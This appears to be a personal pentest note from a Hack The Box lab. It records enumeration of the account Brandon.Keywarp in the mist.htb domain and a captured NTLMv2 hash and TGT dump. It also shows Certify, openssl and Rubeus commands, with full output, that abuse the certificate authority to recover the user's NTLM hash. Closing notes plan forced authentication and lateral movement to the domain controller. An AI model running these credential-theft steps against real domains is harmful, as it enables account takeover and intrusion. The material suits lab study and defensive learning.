# User Brandon.Keywarp

## Information Gathering

### whoami /all

```shell
> whoami /all


USER INFORMATION
----------------

User Name            SID                                           
==================== ==============================================
mist\brandon.keywarp S-1-5-21-1045809509-3006658589-2426055941-1110


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### klist

```shell
C:\Users\Brandon.Keywarp\desktop>klist
klist

Current LogonId is 0:0x68de71

Cached Tickets: (1)

#0>     Client: Brandon.Keywarp @ MIST.HTB
        Server: krbtgt/MIST.HTB @ MIST.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 3/31/2024 2:44:58 (local)
        End Time:   3/31/2024 12:44:58 (local)
        Renew Time: 4/7/2024 2:44:58 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: DC01

#  net view \\DC01.mist.htb\
```


### NTLMv2-SSP Hash

```shell
[SMB] NTLMv2-SSP Client   : 10.129.112.212
[SMB] NTLMv2-SSP Username : MIST\Brandon.Keywarp
[SMB] NTLMv2-SSP Hash     : Brandon.Keywarp::MIST:cbed843dc627b0ad:31A0A7ED97256F11F36DF95630D20D45:010100000000000000530DB5CB83DA0170021255EAD6E5F40000000002000800380033004400330001001E00570049004E002D00500044003500530049005500490057004F0046004B0004003400570049004E002D00500044003500530049005500490057004F0046004B002E0038003300440033002E004C004F00430041004C000300140038003300440033002E004C004F00430041004C000500140038003300440033002E004C004F00430041004C000700080000530DB5CB83DA010600040002000000080030003000000000000000000000000020000066E8C26173C803ADE2491426820AC6738F99C9DD0550D5C1564205F33D2AC9E00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330039000000000000000000
```

### Tgt

#### ticket session
```
PS C:\Users\Brandon.Keywarp\AppData\Roaming\Microsoft\Credentials> klist sessions
klist sessions

Current LogonId is 0:0x977a31
[0] Error calling API LsaGetLogonSessionData on LogonId (0:11943): 0x5
[1] Error calling API LsaGetLogonSessionData on LogonId (0:aca9): 0x5
[2] Error calling API LsaGetLogonSessionData on LogonId (0:3e4): 0x5
[3] Session 0 0:0x977a31 MIST\Brandon.Keywarp Kerberos:Batch
[4] Error calling API LsaGetLogonSessionData on LogonId (0:3e5): 0x5
[5] Error calling API LsaGetLogonSessionData on LogonId (0:acd6): 0x5
[6] Error calling API LsaGetLogonSessionData on LogonId (0:64ec): 0x5
[7] Error calling API LsaGetLogonSessionData on LogonId (0:64cc): 0x5
[8] Error calling API LsaGetLogonSessionData on LogonId (0:6032): 0x5
[9] Error calling API LsaGetLogonSessionData on LogonId (0:3e7): 0x5

klist failed with 0xc0000022/-1073741790: {Access Denied}
```

#### ticket tgt
```
klist tgt

Current LogonId is 0:0x977a31

Cached TGT:

ServiceName        : krbtgt
TargetName (SPN)   : krbtgt
ClientName         : Brandon.Keywarp
DomainName         : MIST.HTB
TargetDomainName   : MIST.HTB
AltTargetDomainName: MIST.HTB
Ticket Flags       : 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 32 - 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
StartTime          : 3/31/2024 9:38:58 (local)
EndTime            : 3/31/2024 19:38:58 (local)
RenewUntil         : 4/7/2024 9:38:58 (local)
TimeSkew           :  + 0:00 minute(s)
EncodedTicket      : (size: 1182)
0000  61 82 04 9a 30 82 04 96:a0 03 02 01 05 a1 0a 1b  a...0...........
0010  08 4d 49 53 54 2e 48 54:42 a2 1d 30 1b a0 03 02  .MIST.HTB..0....
0020  01 02 a1 14 30 12 1b 06:6b 72 62 74 67 74 1b 08  ....0...krbtgt..
0030  4d 49 53 54 2e 48 54 42:a3 82 04 62 30 82 04 5e  MIST.HTB...b0..^
0040  a0 03 02 01 12 a1 03 02:01 02 a2 82 04 50 04 82  .............P..
0050  04 4c 84 a4 86 79 cb 3a:70 e0 bc f3 97 76 24 cb  .L...y.:p....v$.
0060  b3 45 78 86 b1 ab e0 5c:f5 bd 58 5e d6 1b e9 63  .Ex....\..X^...c
0070  f9 ef 66 7c e7 a9 bc 51:61 f9 7d 16 05 29 1a 6d  ..f|...Qa.}..).m
0080  8a a7 52 93 b4 f7 cb 2a:4c 16 7e a7 73 e4 bf 76  ..R....*L.~.s..v
0090  d4 95 05 65 67 f7 d3 67:4f ed 23 35 ec d8 d5 ba  ...eg..gO.#5....
00a0  88 cc 42 64 de 8b 83 bc:f2 83 fc 85 3e 6f e5 4c  ..Bd........>o.L
00b0  2a 69 71 43 1e 73 df 8c:62 a6 d1 48 39 dc 4b 04  *iqC.s..b..H9.K.
00c0  7e fd 69 95 c2 25 89 27:44 57 5e 3f ff 63 5b be  ~.i..%.'DW^?.c[.
00d0  19 e7 32 d4 f9 db bc 03:e3 07 7b b5 a6 c9 20 9a  ..2.......{... .
00e0  84 48 99 de fd 92 2b 3e:d5 9a 71 53 ef 08 6f 0c  .H....+>..qS..o.
00f0  ec ea 78 27 15 c4 46 0e:a6 63 64 73 d7 95 8a eb  ..x'..F..cds....
0100  b1 00 cf c1 43 ac 8a bd:39 8b 33 42 a3 cd 71 d7  ....C...9.3B..q.
0110  e7 16 9c 60 c6 3d 0f 58:3f cb 88 2e 85 69 a9 7c  ...`.=.X?....i.|
0120  9c 82 ca 51 e4 15 9d 14:a5 c1 0e 64 d8 39 87 93  ...Q.......d.9..
0130  a3 64 18 d6 12 4d 1d 77:a1 e8 9e c9 c7 67 d1 80  .d...M.w.....g..
0140  5c 86 48 6d 9f 33 f1 60:66 c6 38 67 2d 2d dc 97  \.Hm.3.`f.8g--..
0150  53 18 b9 a2 c7 5e ac f6:7f c2 ea 17 46 ba d3 ab  S....^......F...
0160  4d a3 d2 4c 55 87 25 f2:30 12 cc 21 8a ad 64 97  M..LU.%.0..!..d.
0170  80 cf 78 93 fa 2f ae bc:a9 c5 58 97 72 60 1f b8  ..x../....X.r`..
0180  e0 bf 6d b8 63 71 b1 01:dd 7f 0f 20 0b aa 9a 3d  ..m.cq..... ...=
0190  25 4e a2 cf 42 53 03 65:03 6e 2d 08 5a 73 57 a1  %N..BS.e.n-.ZsW.
01a0  38 52 b5 62 93 13 c5 8a:f0 55 05 16 0f 3d e6 22  8R.b.....U...=."
01b0  3b af e3 6d 57 10 ed 12:5b 58 ce 1d 98 14 df 2f  ;..mW...[X...../
01c0  fd ef f6 ed 95 74 39 e0:6a a3 f5 87 85 74 30 6a  .....t9.j....t0j
01d0  b4 58 81 d9 05 a8 45 0e:2e 8d be db 46 93 76 c6  .X....E.....F.v.
01e0  77 0f 14 b7 dc 6a c7 00:7e 3f 14 48 2b c5 f6 66  w....j..~?.H+..f
01f0  43 6a 5c ff 5f 44 5f 9b:d7 e4 e8 12 ba c2 42 8c  Cj\._D_.......B.
0200  2d 88 91 13 3f 80 7f c5:a6 12 f3 41 87 cd 41 84  -...?......A..A.
0210  dd e5 72 4b 3c 7a 8b a0:d0 1b 3a 8c 47 f0 05 7c  ..rK<z....:.G..|
0220  d9 bf 72 ad 34 c7 21 ed:03 91 17 25 20 de 43 01  ..r.4.!....% .C.
0230  e3 f1 c1 cf f5 01 8d 87:b3 35 78 fc 73 68 9e b7  .........5x.sh..
0240  96 47 76 1b d2 6e 04 25:ee 12 2d 36 52 3e d4 18  .Gv..n.%..-6R>..
0250  3d d7 aa ad d4 d8 3c 31:32 b9 d5 ae 93 66 c1 16  =.....<12....f..
0260  41 a3 41 04 4b 5e 91 b9:f3 21 bf f7 e0 8d 4f 88  A.A.K^...!....O.
0270  d7 90 53 27 39 bf 38 bc:33 d9 7b ff a6 a6 e2 e5  ..S'9.8.3.{.....
0280  89 2e a6 9d ee cc bc b2:27 2d b9 b1 01 c8 2f 67  ........'-..../g
0290  63 03 78 a4 e4 5c e1 c0:92 92 52 a7 31 60 85 3e  c.x..\....R.1`.>
02a0  bf d5 d2 b5 48 5a 10 2d:12 87 be 6e 61 55 dc 59  ....HZ.-...naU.Y
02b0  67 a2 c8 27 90 f3 1e af:93 54 ea e6 d3 e8 e2 22  g..'.....T....."
02c0  a5 c9 d8 94 0d 6f 2a c8:17 6b 70 13 d0 00 96 ee  .....o*..kp.....
02d0  f4 e7 69 00 e4 07 cf fa:ce 13 57 8b a6 9d 7b 0d  ..i.......W...{.
02e0  2c fe 36 3c d7 07 6c f4:7f d0 7e f2 c0 3c 05 f4  ,.6<..l...~..<..
02f0  7a 92 2c 91 de 0b 58 ce:00 34 61 af 67 75 30 37  z.,...X..4a.gu07
0300  76 9d 7c eb 53 e0 e9 a1:52 51 ba a2 57 a9 59 8b  v.|.S...RQ..W.Y.
0310  26 71 11 44 c8 3f 1a 9d:b7 a4 26 cb 57 0c e1 35  &q.D.?....&.W..5
0320  5f a5 f3 71 d0 e4 ce 2e:a3 f5 91 03 36 9f 5d 28  _..q........6.](
0330  02 e1 fb 5e 76 94 27 6e:70 6f e9 08 72 38 b1 05  ...^v.'npo..r8..
0340  fe 52 64 b9 5f 33 b5 74:cb 90 4c e2 dc c1 84 3a  .Rd._3.t..L....:
0350  c1 1f 54 b6 08 19 00 82:cb d4 a5 81 d9 18 69 75  ..T...........iu
0360  b2 30 0d 5b 41 ba e9 aa:c0 66 d4 48 a8 db 8c f6  .0.[A....f.H....
0370  c9 7e 42 56 26 87 0a 54:cb 67 46 6d c0 13 43 31  .~BV&..T.gFm..C1
0380  14 c0 c5 e5 c0 b7 c6 78:f5 4e b3 82 a4 92 77 13  .......x.N....w.
0390  35 11 84 2f 16 ba e0 af:86 06 38 7f 51 45 32 23  5../......8.QE2#
03a0  4d 56 71 68 d0 73 29 3c:8d a9 cd 30 5c 4f 4c 5c  MVqh.s)<...0\OL\
03b0  5d 93 d3 49 e2 8e fa 9f:e5 8d 19 3d bb aa 52 85  ]..I.......=..R.
03c0  89 2c 26 7c e0 c3 31 d6:d7 1a 38 dc 82 7d c9 e1  .,&|..1...8..}..
03d0  e3 fc 08 82 95 57 cf a3:bf a7 ff 47 5c 16 8e 8c  .....W.....G\...
03e0  6c 48 9f e2 d2 f9 dc ce:00 cf 0a 80 9a 69 94 8f  lH...........i..
03f0  24 5d 3d 5b b1 00 d4 1b:16 f5 c8 f1 e5 8f 2b 7c  $]=[..........+|
0400  de 33 47 29 63 71 b5 7c:5c 9c a5 e4 c7 b7 f7 41  .3G)cq.|\......A
0410  a0 7a 82 ac 81 aa 31 50:cf 8e 71 80 99 fb ac ab  .z....1P..q.....
0420  d1 50 c9 c3 9b 61 a8 d8:03 a0 43 e0 f9 7a f2 96  .P...a....C..z..
0430  ab 59 e7 10 f3 96 21 8c:89 32 b1 8a 1a e1 c8 4c  .Y....!..2.....L
0440  eb 43 c7 66 b6 3f 6b f9:75 80 ea aa cc 0c 67 5d  .C.f.?k.u.....g]
0450  a5 8d c0 74 fb 92 66 8b:af 3e d0 6b 3d e5 a9 d8  ...t..f..>.k=...
0460  d2 a0 43 f4 fa bc 8a 33:e5 a7 7d 7c 85 da b6 35  ..C....3..}|...5
0470  b0 96 28 f7 9b aa 74 8b:b2 2e da 6b e5 56 ae bc  ..(...t....k.V..
0480  76 a0 a0 96 48 a9 67 79:95 f6 53 5a 25 15 62 f4  v...H.gy..SZ%.b.
0490  2e 59 75 3d 72 bf 12 6e:79 56 2b 74 a2 9e        .Yu=r..nyV+t..
```

## Dump NTLM

```
Invoke-Certify  request  /ca:DC01.mist.htb\mist-DC01-CA /currentuser

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 
export password=test

.\Rubeus asktgt /getcredentials /user:Brandon.Keywarp /certificate:cert.pfx /password:test /domain:mist.htb /dc:dc01.mist.htb /show


.\Rubeus asktgt /getcredentials /user:Brandon.Keywarp /certificate:cert.pfx /password:test /domain:mist.htb /dc:dc01.mist.htb /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\Brandon.Keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      Lmh0Yg==

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  Brandon.Keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  4/2/2024 1:53:53 AM
  EndTime                  :  4/2/2024 11:53:53 AM
  RenewTill                :  4/9/2024 1:53:53 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  ctOO8rMWy+Xj4xw7ZBJK4Q==
  ASREP (key)              :  99D9B393FD5FE7D6D2BE1FE51B6AD6C3

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9

```






## What's Next

![[original.png]] 


[[MS01$]] force authentication with [PKINITtools](https://github.com/dirkjanm/PKINITtools) and Leak [[user-Sharon.Mullard]]

maybe has same password or something to [[user-Sharon.Mullard#User Op_Sharon.Mullard]] to PS remote the DC01

exploit [[force-auth-ms01]]
